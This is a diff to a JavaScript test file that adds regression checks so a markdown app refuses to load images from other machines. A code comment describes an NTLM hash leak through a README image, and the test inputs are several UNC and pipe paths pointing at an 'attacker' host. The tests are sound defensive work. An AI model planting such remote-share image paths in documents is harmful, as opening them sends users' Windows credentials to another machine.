@@ -22,7 +22,7 @@ await build({
   outdir: out,
 })
 
-const { toggleTaskLine } = await import(`file://${out}/markdown.js`)
+const { toggleTaskLine, resolveImage } = await import(`file://${out}/markdown.js`)
 
 let passed = 0
 const check = (name, fn) => {
@@ -81,6 +81,34 @@ check('a CRLF file comes back as CRLF, and only the one line differs', () => {
 
 check('an already-ticked box asked to tick again is a no-op in content', () => {
   assert.equal(toggleTaskLine(LIST, 3, true), LIST)
+})
+
+// A document's images, and the one kind it may not ask for. Loading an image
+// from another machine is a network connection, and on Windows an
+// authenticated one: `![](\\attacker\share\a.png)` in a README made the app
+// offer that machine the user's NTLM hash just by opening the file.
+check('an image on another machine is not loaded, however it is spelled', () => {
+  for (const src of [
+    '\\\\attacker\\share\\a.png',
+    '//attacker/share/a.png',
+    '\\\\?\\UNC\\attacker\\share\\a.png',
+    '\\\\.\\pipe\\a.png',
+  ]) {
+    assert.equal(resolveImage(src, 'C:\\docs'), null, src)
+  }
+})
+
+check('local images still resolve, absolute and relative', () => {
+  assert.equal(resolveImage('../shots/a.png', 'C:\\docs\\guide'), 'C:\\docs\\shots\\a.png')
+  assert.equal(resolveImage('C:\\pics\\a.png', 'C:\\docs'), 'C:\\pics\\a.png')
+  assert.equal(resolveImage('\\\\?\\C:\\pics\\a.png', 'C:\\docs'), '\\\\?\\C:\\pics\\a.png')
+  assert.equal(resolveImage('img/a.png', '/Users/me/docs'), '/Users/me/docs/img/a.png')
+})
+
+// The README the user opened from a share is theirs to open; its own images
+// sit beside it on the same machine, which is not another machine.
+check('a document opened from a share still shows the images beside it', () => {
+  assert.equal(resolveImage('a.png', '\\\\server\\share\\docs'), '\\\\server\\share\\docs\\a.png')
 })
 
 console.log(`\n${passed} checks passed`)
